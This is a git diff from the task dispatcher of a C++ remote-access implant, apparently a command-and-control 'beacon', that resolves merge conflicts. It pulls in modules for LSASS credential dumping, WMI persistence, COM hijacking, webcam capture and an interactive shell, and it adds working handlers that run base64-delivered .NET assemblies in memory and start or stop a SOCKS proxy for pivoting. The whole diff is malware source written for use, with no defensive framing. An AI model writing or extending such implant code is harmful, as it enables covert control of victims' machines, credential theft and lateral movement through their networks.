@@ -11,16 +11,10 @@
 #include "../capture/Webcam.h"
 #include "../streaming/Streamer.h"
 #include "../shell/InteractiveShell.h"
-#include "../fs/FileSystem.h"
-#include "../recon/DeepRecon.h"
-#include "../crypto/Base64.h"
-<<<<<<< HEAD
 #include "../execution/DotNetExecutor.h"
 #include "../persistence/WmiPersistence.h"
 #include "../persistence/ComHijacker.h"
 #include "../credential/LsassDumper.h"
-=======
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
 #include <stdexcept>
 
 namespace beacon {
@@ -189,13 +183,46 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
-<<<<<<< HEAD
             case TaskType::EXECUTE_ASSEMBLY: {
-                // ... (previous logic)
+                // Cmd format: "b64_assembly:arg1 arg2 arg3"
+                size_t colon = task.cmd.find(':');
+                if (colon != std::string::npos) {
+                    std::string b64 = task.cmd.substr(0, colon);
+                    std::string argsStr = task.cmd.substr(colon + 1);
+                    
+                    std::vector<uint8_t> assembly = crypto::Base64Decode(b64);
+                    
+                    // Split args (simple space-split for now)
+                    std::vector<std::wstring> args;
+                    std::wstringstream ss(std::wstring(argsStr.begin(), argsStr.end()));
+                    std::wstring arg;
+                    while (ss >> arg) args.push_back(arg);
+
+                    execution::DotNetExecutor executor;
+                    result.output = executor.Execute(assembly, args);
+                } else {
+                    result.error = "Invalid execute-assembly format (expected b64:args)";
+                }
                 break;
             }
             case TaskType::SOCKS_PROXY: {
-                // ... (previous logic)
+                // Cmd format: "start [port]" or "stop"
+                if (task.cmd.find("start") == 0) {
+                    int port = 1080;
+                    try {
+                        size_t space = task.cmd.find(' ');
+                        if (space != std::string::npos) port = std::stoi(task.cmd.substr(space + 1));
+                    } catch(...) {}
+                    
+                    if (m_socksProxy.Start(port)) {
+                        result.output = "SOCKS_PROXY_STATUS:Started on port " + std::to_string(port);
+                    } else {
+                        result.error = "Failed to start SOCKS proxy (already running or port busy)";
+                    }
+                } else if (task.cmd == "stop") {
+                    m_socksProxy.Stop();
+                    result.output = "SOCKS_PROXY_STATUS:Stopped";
+                }
                 break;
             }
             case TaskType::ADV_PERSISTENCE: {
@@ -227,8 +254,6 @@ void TaskDispatcher::dispatch(const Task& task) {
                 }
                 break;
             }
-=======
->>>>>>> 68f7affb5880fa8c91159abe3758b8e0be161009
             // Add other task types here as they are implemented
             default:
                 result.error = "Unknown or unsupported task type.";
